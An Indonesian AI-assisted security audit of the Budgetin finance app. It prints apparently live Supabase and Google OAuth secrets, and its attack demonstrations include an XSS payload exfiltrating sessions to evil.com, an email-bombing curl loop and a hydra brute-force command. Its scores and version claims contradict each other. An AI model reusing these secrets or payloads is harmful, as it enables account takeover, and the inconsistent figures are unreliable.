# 🔐 LAPORAN AUDIT KEAMANAN — BUDGETIN
## DevSecOps Security Audit Report

**Tanggal Audit:** 3 April 2026  
**Auditor:** Senior Security Engineer / DevSecOps Auditor (AI-Assisted)  
**Target:** Aplikasi Budgetin — Manajemen Keuangan Pribadi  
**Tech Stack:** Next.js 16, Supabase (PostgreSQL + Auth), Vercel, TypeScript, Zustand  
**Repository:** `github.com/linoshuke/budgetin`  
**Deployment:** Vercel (Hobby Plan)  
**Data Sensitif:** Data keuangan pengguna (saldo, transaksi, dompet, target tabungan)

---

## 🔴 EXECUTIVE SUMMARY

Audit ini dilakukan berdasarkan analisis langsung terhadap kode sumber. Ditemukan **4 temuan Critical**, **3 temuan High**, **5 temuan Medium**, dan **3 temuan Low**. Risiko terbesar adalah **credential exposure di file .env yang sudah commit ke repo**, yang memungkinkan attacker mengakses Supabase dan seluruh data pengguna secara langsung. CSP yang salah konfigurasi dan ketiadaan rate limiting juga membuka vektor serangan serius.

**Security Score: 42 / 100**

---

## ❌ TEMUAN CRITICAL

---

### [CRITICAL-1] Credential Sensitif Tersimpan di File `.env` dan `.env.local`

**Masalah:**  
File `.env` dan `.env.local` mengandung credential production yang sangat sensitif dan **berpotensi ter-commit ke Git**:

```
# .env & .env.local (REAL VALUES — BUKAN CONTOH)
NEXT_PUBLIC_SUPABASE_URL=https://niqihytoexmjojdgltng.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=sb_publishable_Y4dtVNiAFC0aoEU1HchXhg_vA751Yie
SUPABASE_AUTH_EXTERNAL_GOOGLE_SECRET=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
VERCEL_OIDC_TOKEN=eyJhbGciOiJSUzI1NiIsInR5cC...  (JWT lengkap)
```

Meskipun `.gitignore` berisi aturan `.env*`, file `.env` (tanpa `.local`) **memiliki pattern `.env*`** tapi ada kemungkinan versi lama atau branch lain sudah ter-commit. Yang lebih kritis: `GOOGLE_SECRET` dan `VERCEL_OIDC_TOKEN` adalah **server-side secrets** yang seharusnya tidak pernah ada di file env lokal yang bisa dibaca siapapun yang mengakses mesin.

**Dampak Bisnis:**  
- Attacker yang mendapat akses ke repo atau mesin developer mendapatkan:
  - Akses penuh ke Supabase database (anon key + project URL)
  - Kemampuan membuat akun Google OAuth baru menggunakan OAuth Secret
  - Akses Vercel deployment sebagai owner project
- Seluruh data keuangan pengguna bisa dibaca, dimodifikasi, atau dihapus

**Cara Eksploitasi (Simulasi Attacker):**  
```
1. Attacker fork/clone repo atau akses mesin developer yang ter-expose
2. Buka file .env → dapatkan SUPABASE_URL dan ANON_KEY
3. Langsung query Supabase REST API:
   curl -H "apikey: sb_publishable_Y4dtVNiAFC0aoEU1HchXhg_vA751Yie" \
        -H "Authorization: Bearer sb_publishable_..." \
        "https://niqihytoexmjojdgltng.supabase.co/rest/v1/profiles?select=*"
4. Jika RLS tidak sempurna → dump semua data user
5. Gunakan GOOGLE_SECRET untuk forge OAuth token atau tambah authorized redirect URIs
```

**Solusi:**  
```bash
# 1. Rotasi SEMUA credential yang terekspos SEKARANG
# Di Supabase Dashboard → Settings → API → Generate new anon key
# Di Google Cloud Console → OAuth 2.0 → Delete & recreate secret
# Di Vercel → Settings → Tokens → Revoke & regenerate

# 2. Gunakan Vercel untuk menyimpan env vars (BUKAN file lokal)
vercel env pull .env.local  # Untuk sync ke lokal SAJA (jangan commit)

# 3. Audit git history untuk memastikan belum ter-commit
git log --all --full-history -- .env
git log -S "niqihytoexmjojdgltng" --all

# 4. Jika sudah ter-commit: BFG Repo Cleaner atau git-filter-repo untuk purge history
```

---

### [CRITICAL-2] Content Security Policy (CSP) Dengan `unsafe-eval` dan `unsafe-inline`

**Masalah:**  
Di `next.config.mjs`, CSP dikonfigurasi dengan:

```javascript
"script-src 'self' 'unsafe-inline' 'unsafe-eval'",
"style-src 'self' 'unsafe-inline'",
```

- `unsafe-eval` membatalkan seluruh proteksi CSP terhadap XSS, karena attacker bisa inject dan eval JavaScript arbitrary
- `unsafe-inline` memungkinkan inline script/style execution, vektor utama XSS reflected

**Dampak Bisnis:**  
- Jika ada XSS pada satu titik (contoh: field `note` transaksi, atau nama wallet/kategori yang dirender), CSP tidak akan memblokirnya
- Attacker bisa steal session cookie, hijack akun, dan mengekstrak semua data keuangan

**Cara Eksploitasi:**  
```
Skenario: Field "note" transaksi tidak di-sanitize di rendering
1. Attacker login & buat transaksi dengan note:
   <img src=x onerror="fetch('/api/auth/session').then(r=>r.json()).then(d=>fetch('https://evil.com/steal?d='+JSON.stringify(d)))">
2. Karena unsafe-inline/eval diaktifkan, payload berhasil dieksekusi di browser korban
3. Attacker terima session data → impersonate user
```

**Solusi:**  
```javascript
// next.config.mjs — Gunakan nonce-based CSP
import crypto from 'crypto';

// Di middleware, generate nonce per-request
const nonce = crypto.randomBytes(16).toString('base64');

const contentSecurityPolicy = [
  "default-src 'self'",
  `script-src 'self' 'nonce-${nonce}'`,  // Hapus unsafe-inline, unsafe-eval
  "style-src 'self' 'nonce-{nonce}'",     // Atau gunakan hash untuk style kritis
  // ... rest
].join("; ");

// Catatan: Next.js 13+ mendukung nonce via middleware
// https://nextjs.org/docs/app/building-your-application/configuring/content-security-policy
```

---

### [CRITICAL-3] Tidak Ada Rate Limiting pada Auth Endpoints — Brute Force Attack

**Masalah:**  
Endpoint `/api/auth/login`, `/api/auth/register`, `/api/auth/password-reset`, dan `/api/auth/resend` **tidak memiliki rate limiting sama sekali** di level aplikasi. Kode di `route.ts` langsung memanggil Supabase tanpa throttling, CAPTCHA, atau lockout mechanism:

```typescript
// /api/auth/login/route.ts — Tidak ada rate limit apapun
export async function POST(request: Request) {
  const supabase = await createServerSupabase();
  const { email, password } = (await request.json()...);
  const { data, error } = await supabase.auth.signInWithPassword({ email, password });
  // ← Bisa dipanggil ribuan kali per detik
```

Supabase memiliki default rate limiting, namun **Vercel Hobby Plan** tidak memiliki built-in WAF atau DDoS protection yang memadai.

**Dampak Bisnis:**  
- Brute force terhadap akun user dengan password lemah
- Credential stuffing attack menggunakan breach database
- Account takeover massal
- Email bombing via endpoint `/api/auth/resend` (spam resend verification email ke korban)

**Cara Eksploitasi:**  
```bash
# Email bombing — kirim ribuan request resend email ke korban
for i in {1..1000}; do
  curl -s -X POST https://budgetin.vercel.app/api/auth/resend \
    -H "Content-Type: application/json" \
    -d '{"email":"korban@email.com"}' &
done

# Brute force login
hydra -l target@email.com -P /wordlists/rockyou.txt \
  https://budgetin.vercel.app http-post-form \
  "/api/auth/login:email=^USER^&password=^PASS^:error"
```

**Solusi:**  
```typescript
// Gunakan Vercel Edge Rate Limiting atau implementasi manual dengan KV store
// Option 1: @vercel/kv untuk rate limiting
import { kv } from '@vercel/kv';

async function rateLimit(ip: string, endpoint: string, limit = 5, windowMs = 60000) {
  const key = `ratelimit:${endpoint}:${ip}`;
  const count = await kv.incr(key);
  if (count === 1) await kv.pexpire(key, windowMs);
  if (count > limit) throw new ServiceError('Too Many Requests', 429);
}

// Option 2: Tambahkan middleware di middleware.ts
// Option 3: Enable Vercel WAF (upgrade plan atau gunakan Cloudflare Free)
```

---

### [CRITICAL-4] `NEXT_PUBLIC_*` Keys Terekspos di Client-Side Bundle

**Masalah:**  
```javascript
// supabase/client.ts
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL ?? "";
const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ?? "";
```

Prefix `NEXT_PUBLIC_` artinya nilai ini **di-bundle ke JavaScript yang dikirim ke browser**. Siapapun bisa melihatnya melalui DevTools → Sources atau Network tab. Ini bukan bug per se (Supabase anon key memang public), **tapi dikombinasikan dengan RLS yang tidak sempurna, ini berbahaya.**

AGENTS.md bahkan secara eksplisit memperingatkan: *"Store secrets in Vercel Env Variables; not in git or `NEXT_PUBLIC_*`"* — tapi `SUPABASE_AUTH_EXTERNAL_GOOGLE_SECRET` disimpan di `.env` yang sama dengan public keys.

**Dampak Bisnis:**  
- Attacker ambil anon key dari bundle JavaScript
- Query langsung ke Supabase REST API *di luar* aplikasi
- Bypass Next.js API middleware → eksploitasi RLS gaps langsung

**Solusi:**  
```bash
# Pindahkan semua request Supabase melalui Next.js API routes (server-side ONLY)
# Jangan buat koneksi Supabase langsung dari browser
# Anon key tetap bisa public, tapi semua query via server proxy

# Pastikan RLS kuat di semua tabel — lihat rekomendasi di bawah
```

---

## 🟠 TEMUAN HIGH

---

### [HIGH-1] Email Update Tanpa Re-Authentication

**Masalah:**  
`/api/auth/email-update/route.ts`:
```typescript
export async function POST(request: Request) {
  const supabase = await createServerSupabase();
  const { email } = (await request.json()...) as { email?: string };
  // ← TIDAK ADA VERIFIKASI PASSWORD / RE-AUTH
  const { error } = await supabase.auth.updateUser({ email });
```

Endpoint ini mengizinkan perubahan email tanpa meminta password saat ini. Jika session dicuri (XSS, MITM, atau stolen cookie), attacker bisa langsung mengubah email korban dan *lock out* pengguna dari akunnya sendiri.

**Cara Eksploitasi:**  
```
1. Attacker steal session via XSS atau shared computer
2. POST /api/auth/email-update dengan email baru (milik attacker)
3. Korban kehilangan akses akun — email dikuasai attacker
4. Attacker gunakan "forgot password" → reset ke akun attacker
5. Account takeover complete
```

**Solusi:**  
```typescript
// Wajibkan current password atau OTP sebelum update email
export async function POST(request: Request) {
  const supabase = await createServerSupabase();
  const { email, currentPassword } = await request.json();
  
  // Re-verifikasi identity terlebih dahulu
  const { data: { user } } = await supabase.auth.getUser();
  const { error: verifyError } = await supabase.auth.signInWithPassword({
    email: user.email!,
    password: currentPassword,
  });
  if (verifyError) return NextResponse.json({ error: "Password salah" }, { status: 401 });
  
  await supabase.auth.updateUser({ email });
}
```

---

### [HIGH-2] Goals Endpoint Tanpa Input Validation Schema (Zod)

**Masalah:**  
`/api/auth/goals/route.ts` dan `/api/auth/goals/[id]/route.ts` tidak menggunakan Zod schema validation, berbeda dengan endpoint lain (transactions, wallets, categories, profiles):

```typescript
// goals/route.ts — Validasi manual dan tidak lengkap
const raw = (await request.json().catch(() => ({}))) as {
  name?: string;
  targetAmount?: number;
  currentAmount?: number;
  targetDate?: string | null;
};

if (!raw.name || !raw.targetAmount) {
  return NextResponse.json({ error: "Nama dan target wajib diisi." }, { status: 400 });
}
// ← Tidak ada validasi: panjang string, tipe angka, format tanggal
// ← currentAmount bisa bernilai negatif tak terbatas
// ← targetDate tidak divalidasi formatnya
// ← name bisa berisi string sepanjang apapun → potensial DoS via large payload
```

Begitu pula di `PATCH /api/goals/[id]`, semua field bisa diisi nilai ekstrem tanpa validasi.

**Cara Eksploitasi:**  
```bash
# Kirim payload ekstrem untuk menguji behavior
curl -X POST https://budgetin.vercel.app/api/goals \
  -H "Content-Type: application/json" \
  -H "Cookie: [session cookie]" \
  -d '{
    "name": "'$(python3 -c "print('A'*100000)'")'",
    "targetAmount": -999999999999999,
    "currentAmount": -1,
    "targetDate": "invalid-date-format; DROP TABLE goals;--"
  }'

# targetDate dikirim ke Supabase without sanitization
# Jika ada injection vulnerability di PostgreSQL date parsing → SQL Injection
```

**Solusi:**  
```typescript
// Tambahkan ke validators.ts
export const CreateGoalSchema = z.object({
  name: z.string().min(1).max(100),
  targetAmount: z.number().positive().max(999_999_999),
  currentAmount: z.number().min(0).max(999_999_999).optional().default(0),
  targetDate: z.string().date().optional().nullable(),
});

// Gunakan di route handler — sama seperti CreateTransactionSchema
```

---

### [HIGH-3] Tidak Ada Middleware Auth Route Protection (Server-Side)

**Masalah:**  
File `src/proxy.ts` berisi fungsi `refreshSession` yang dipanggil sebagai middleware, namun tidak ada **route protection** di server level. Semua auth check dilakukan di client-side (`AuthGate` component di `providers.tsx`):

```typescript
// providers.tsx — Client-side hanya, NO server-side guard
function AuthGate({ children }: { children: ReactNode }) {
  const loading = useAuthStore((state) => state.loading);
  const user = useAuthStore((state) => state.user);
  // ← JavaScript disabled? → No protection
  // ← Direct API call? → No protection di level middleware
```

Tidak ada `middleware.ts` yang mem-protect routes seperti `/profile`, `/wallets`, `/transactions` dll di server-side.

**Cara Eksploitasi:**  
```
1. Attacker disable JavaScript di browser
2. Akses langsung URL /beranda, /transaksi, /dompet
3. AuthGate tidak berjalan → halaman ter-render tanpa auth check
4. Meskipun API calls akan fail (karena server-side auth), HTML + struktur app terekspos
5. Attacker bisa scrape UI structure, endpoints, dan parameter names
```

**Solusi:**  
```typescript
// Buat middleware.ts di root:
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { refreshSession } from "@/lib/supabase/proxy";

const PROTECTED_ROUTES = ['/beranda', '/transaksi', '/dompet', '/anggaran', '/laporan'];
const AUTH_ROUTES = ['/login', '/signup'];

export async function middleware(request: NextRequest) {
  const response = await refreshSession(request);
  
  // Cek session dari cookie
  const sessionCookie = request.cookies.get('sb-access-token')?.value 
                     || request.cookies.getAll().find(c => c.name.includes('auth-token'));
  
  const isProtected = PROTECTED_ROUTES.some(r => request.nextUrl.pathname.startsWith(r));
  const isAuth = AUTH_ROUTES.some(r => request.nextUrl.pathname.startsWith(r));
  
  if (isProtected && !sessionCookie) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
  
  return response;
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico|api/auth/anonymous).*)'],
};
```

---

## 🟡 TEMUAN MEDIUM

---

### [MEDIUM-1] Anonymous Login Tanpa Rate Limiting — Potensi Resource Abuse

**Masalah:**  
`/api/auth/anonymous/route.ts`:
```typescript
export async function POST() {
  const supabase = await createServerSupabase();
  const { data, error } = await supabase.auth.signInAnonymously();
  // ← Bisa dipanggil unlimited kali — buat ribuan anon user
```

**Dampak:** Attacker bisa membuat jutaan akun anonim dan mengeksploitasi setiap akun hingga batas (50 transaksi, 2 wallets), menyebabkan kehabisan kapasitas database.

**Solusi:** Tambahkan IP-based rate limiting + Turnstile CAPTCHA (Cloudflare, gratis) untuk anonymous sign-in.

---

### [MEDIUM-2] Informasi Error Leak dari Database

**Masalah:**  
Di beberapa service file, error Supabase langsung di-propagate:

```typescript
// transaction.service.ts
if (error) {
  throw new ServiceError(error.message); // ← Pesan error raw dari PostgreSQL
}

// wallet.service.ts  
throw new ServiceError(error.message); // ← Bisa mengandung schema info
```

Meskipun `handleServiceError` menyembunyikan pesan untuk status 500, error di bawah 500 (seperti constraint violation) masih mengembalikan pesan database asli.

**Solusi:**  
```typescript
// Map database errors ke pesan user-friendly
const DB_ERROR_MAP: Record<string, string> = {
  '23505': 'Data sudah ada.',
  '23503': 'Referensi tidak valid.',
  'PGRST116': 'Data tidak ditemukan.',
};

function mapDbError(error: { code?: string; message: string }): ServiceError {
  const msg = DB_ERROR_MAP[error.code ?? ''] ?? 'Terjadi kesalahan.';
  return new ServiceError(msg, error.code === 'PGRST116' ? 404 : 400);
}
```

---

### [MEDIUM-3] CORS Tidak Dikonfigurasi Eksplisit di API Routes

**Masalah:**  
Tidak ada konfigurasi CORS eksplisit di API routes. Next.js secara default mengizinkan same-origin, tapi tidak ada validasi `Origin` header yang eksplisit. Dengan credential berupa cookies (bukan Authorization header Bearer), CSRF attacks menjadi relevan jika CORS tidak dikonfigurasi benar — meskipun Supabase menggunakan cookie-based auth.

**Solusi:**  
```typescript
// lib/cors.ts — Buat helper CORS
export function setCorsHeaders(response: NextResponse, allowedOrigin: string) {
  response.headers.set('Access-Control-Allow-Origin', allowedOrigin);
  response.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
  response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  response.headers.set('Access-Control-Allow-Credentials', 'true');
  return response;
}
```

---

### [MEDIUM-4] Balance Update Tidak Atomic — Race Condition

**Masalah:**  
Di `POST /api/transactions/route.ts`, update balance wallet dilakukan dalam 2 query terpisah:

```typescript
// Langkah 1: Baca balance saat ini
const { data: wallet } = await supabase.from("wallets")
  .select("id, balance").eq("id", dto.walletId).eq("user_id", user.id).single();

// Langkah 2: Tulis balance baru (TIDAK ATOMIC!)
const nextBalance = Number(wallet.balance ?? 0) + delta;
await supabase.from("wallets").update({ balance: nextBalance }).eq("id", wallet.id);
```

**Dampak:** Jika user mengirim 2 request bersamaan (double-click atau programmatic), kedua request membaca balance yang sama dan menulis hasil yang salah → balance korup.

**Solusi:**  
```sql
-- Gunakan atomic SQL update alih-alih read-then-write
UPDATE wallets 
SET balance = balance + $delta 
WHERE id = $wallet_id AND user_id = $user_id;

-- Atau gunakan Supabase RPC function untuk atomic update
```

---

### [MEDIUM-5] Tidak Ada Security Headers untuk API Routes

**Masalah:**  
Security headers di `next.config.mjs` diterapkan ke semua routes `"/(.*)"`, termasuk API. Namun beberapa headers seperti `X-Frame-Options: DENY` tidak relevan untuk API, dan headers penting seperti `Cache-Control: no-store` untuk response auth tidak diatur di level API.

Selain itu, `Cross-Origin-Opener-Policy: same-origin-allow-popups` dipilih padahal lebih aman menggunakan `same-origin` saja untuk aplikasi yang tidak menggunakan popup OAuth secara langsung di browser.

**Solusi:**  
```typescript
// Tambahkan ke semua API auth responses
return NextResponse.json(data, {
  headers: {
    'Cache-Control': 'no-store, no-cache, must-revalidate',
    'Pragma': 'no-cache',
  }
});
```

---

## 🟢 TEMUAN LOW

---

### [LOW-1] Password Policy Minimal — Hanya Minimum 8 Karakter

```typescript
// password-update/route.ts
if (!password || password.length < 8) {
  return NextResponse.json({ error: "Kata sandi minimal 8 karakter." }, { status: 400 });
}
```

Tidak ada validasi kompleksitas (huruf besar, angka, simbol). Password `12345678` diterima.

**Solusi:** Tambahkan Zod schema dengan regex validasi kompleksitas password.

---

### [LOW-2] Tidak Ada Logging Audit Trail

Tidak ada logging untuk event keamanan kritis:
- Failed login attempts
- Account lockout events
- Password/email changes
- Unusual access patterns

Hanya ada `console.error` untuk ServiceError. Di production Vercel, ini hilang setelah waktu retention log.

**Solusi:** Integrasi dengan Vercel Log Draining + external monitoring (Sentry, Logtail, atau Logflare — tersedia gratis tier).

---

### [LOW-3] Dependency Audit

Dari `package.json`, beberapa versi dependency perlu diaudit:

```json
"next": "16.1.6"              // Versi terbaru 15.x — cek CVE terbaru
"@supabase/ssr": "^0.9.0"    // Periksa breaking changes security
"dotenv": "^17.3.1"           // Versi sangat baru, rilis April 2026
```

**Catatan:** `dotenv` versi `^17.3.1` adalah versi yang sangat baru (April 2026). Verifikasi integritas package dan changelog untuk security fixes.

**Solusi:**  
```bash
# Jalankan audit dependency secara rutin
npm audit
bun audit

# Aktifkan Dependabot di GitHub repo untuk otomatisasi
# Buat .github/dependabot.yml
```

---

## 🎯 SIMULASI SERANGAN NYATA (End-to-End Attack Chain)

### Skenario: "Credential Stuffing + Account Takeover"

```
[TARGET]: Pengguna Budgetin dengan password lemah
[ATTACKER GOAL]: Akses data keuangan dan lock out user

FASE 1 — Reconnaissance (0:00)
  → Attacker download .env dari repo (jika pernah ter-commit)
    ATAU buka DevTools, ambil NEXT_PUBLIC_SUPABASE_URL dari JS bundle
  → Endpoint discovery: semua API routes terlihat dari source code publik

FASE 2 — Initial Access (0:05)
  → Gunakan breach database (HaveIBeenPwned) dengan email target
  → Jalankan credential stuffing ke /api/auth/login:
    POST https://budgetin.vercel.app/api/auth/login
    {"email": "target@gmail.com", "password": "password123"}
  → Tidak ada rate limit → 1000 req/min = brute force feasible
  → Login berhasil setelah 3 percobaan

FASE 3 — Persistence & Data Exfil (0:08)
  → Dengan session cookie aktif:
    GET /api/wallets → list semua dompet + saldo
    GET /api/transactions?limit=200 → semua riwayat transaksi
    GET /api/profiles → nama, email, preferensi
    GET /api/goals → target tabungan pribadi
  → Export semua data dalam 30 detik

FASE 4 — Account Takeover (0:09)
  → POST /api/auth/email-update {"email": "attacker@evil.com"}
    (tidak butuh current password!)
  → Korban kehilangan akses
  → POST /api/auth/password-reset {"email": "attacker@evil.com"}
    → Reset link dikirim ke email attacker
  → Account sepenuhnya di-takeover

FASE 5 — Covering Tracks (0:12)
  → Tidak ada audit log → jejak terhapus
  → Tidak ada real-time alert → korban tidak tahu sampai coba login besok
```

---

## 🏆 TOP 5 RISIKO TERBESAR

| # | Risiko | Likelihood | Impact | Priority |
|---|--------|-----------|--------|----------|
| 1 | Credential (.env) Exposure + Rotation | Critical | Sangat Tinggi | **IMMEDIATE** |
| 2 | No Rate Limiting → Brute Force / Email Bomb | High | Tinggi | **IMMEDIATE** |
| 3 | Email Update tanpa Re-Auth → Account Takeover | Medium | Sangat Tinggi | **Minggu Ini** |
| 4 | CSP `unsafe-eval` + `unsafe-inline` → XSS | Low-Med | Sangat Tinggi | **Sprint Ini** |
| 5 | No Server-Side Route Protection | Medium | Tinggi | **Sprint Ini** |

---

## ⚡ 5 QUICK WINS (Fix Cepat, Impact Tinggi)

### QW-1: Rotasi Semua Credential (15 menit)
```bash
# 1. Supabase Dashboard → Settings → API → Rotate keys
# 2. Google Cloud Console → OAuth → Delete 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
# 3. Vercel → Settings → Env Vars → Update semua
# 4. JANGAN simpan credential baru di file .env lokal
```

### QW-2: Tambahkan Zod Validation ke Goals API (30 menit)
```typescript
// Di validators.ts — tambahkan CreateGoalSchema & UpdateGoalSchema
// Terapkan di goals/route.ts dan goals/[id]/route.ts
// Pattern sudah ada di transactions, tinggal copy-paste dan adapt
```

### QW-3: Require Current Password di Email Update (20 menit)
```typescript
// Di email-update/route.ts
// Tambahkan verifikasi password sebelum supabase.auth.updateUser({ email })
```

### QW-4: Tambahkan `Cache-Control: no-store` ke Auth Responses (10 menit)
```typescript
// Wrap semua auth endpoint responses dengan no-cache headers
// Mencegah caching credential/session di CDN atau proxy
```

### QW-5: Aktifkan Dependabot di GitHub (5 menit)
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/budgetin"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5
```

---

## 📋 COMPLIANCE CHECK

### UU PDP Indonesia (UU No. 27 Tahun 2022)
| Pasal | Requirement | Status |
|-------|-------------|--------|
| Pasal 35 | Prinsip perlindungan data pribadi | ⚠️ Partial |
| Pasal 38 | Menggunakan sistem keamanan yang memadai | ❌ Belum ada enkripsi at-rest, audit log |
| Pasal 46 | Notifikasi kebocoran data | ❌ Tidak ada SOP breach notification |
| Pasal 65 | Perlindungan data dari akses tidak sah | ⚠️ RLS ada tapi tidak lengkap |

### OWASP Top 10 (2021)
| # | Kategori | Status |
|---|---------|--------|
| A01 | Broken Access Control | ✅ RLS ada, tapi server-side middleware belum |
| A02 | Cryptographic Failures | ✅ HTTPS enforced, HSTS ada |
| A03 | Injection | ✅ Supabase parameterized queries |
| A04 | Insecure Design | ⚠️ Email update tanpa re-auth |
| A05 | Security Misconfiguration | ❌ CSP unsafe-eval/inline |
| A06 | Vulnerable Components | ⚠️ Perlu audit |
| A07 | Identification & Authentication Failures | ❌ No MFA, no rate limit |
| A09 | Security Logging & Monitoring Failures | ❌ Tidak ada audit log |

---

## 📊 SECURITY SCORECARD

| Kategori | Max | Score | Status |
|----------|-----|-------|--------|
| Otentikasi & Akses | 25 | 10 | ❌ Tidak ada MFA, rate limit, re-auth |
| Infrastruktur & Network | 20 | 12 | ⚠️ HTTPS ok, tidak ada WAF |
| Software Supply Chain | 15 | 10 | ⚠️ Perlu Dependabot |
| Code Security | 25 | 13 | ❌ CSP lemah, secrets di env |
| Monitoring & Incident Response | 15 | 2 | ❌ Tidak ada logging, alert, SOP |
| **TOTAL** | **100** | **47** | **⚠️ Perlu Perbaikan Segera** |

---

*Laporan ini dibuat berdasarkan analisis kode sumber statik. Tidak ada pengujian aktif (penetration test) yang dilakukan terhadap sistem production.*

*Prioritaskan CRITICAL-1 (rotasi credential) HARI INI — ini adalah risiko paling mendesak.*
